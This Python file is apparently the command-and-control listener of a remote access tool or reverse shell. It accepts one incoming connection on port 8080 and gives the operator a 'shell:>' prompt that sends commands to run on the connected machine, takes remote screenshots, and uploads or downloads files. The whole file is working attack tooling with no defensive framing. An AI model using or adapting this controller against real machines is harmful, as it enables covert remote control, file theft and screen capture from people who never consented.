import socket
import os
import time
ip="localhost"#Your address or this computer address
port=8080 #Port number you want to use
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((ip,port))
s.listen(1)
conn,addr=s.accept()
print("[+]Connected to %s on port:%s"%(addr,port))


def download(filename):
        f=open(filename,"wb")
        while True:
            data=conn.recv(1024)          
            if  b"DONE" == data:
                break
            else:
                f.write(data)
                print(data)
        f.close()
        print("done receving")

def upload(filename):
    f=open(filename,"rb")
    data=f.read(1024)
    while (data):
        conn.send(data)
        data=f.read(1024)
    f.close()
    conn.send(b"DONE")

while True:
    inp=input("shell:>")
    if inp == "exit":
        conn.send(b"exit")
        conn.close()
     
    elif inp.startswith("run="):
        conn.send(inp.encode())
        print((conn.recv(1024)).decode())
    elif inp=="sc":
        conn.send(b"screenshot")
        download("sc.png")
    elif inp.startswith("upload="):
        conn.send((inp).encode())        
        time.sleep(1)
        upload((inp[7:]))
    elif inp.startswith("download="):
        conn.send(inp.encode())
        time.sleep(1)
        download(inp[9:])
    elif inp=="":
        pass
    else:
        print("Enter right command")
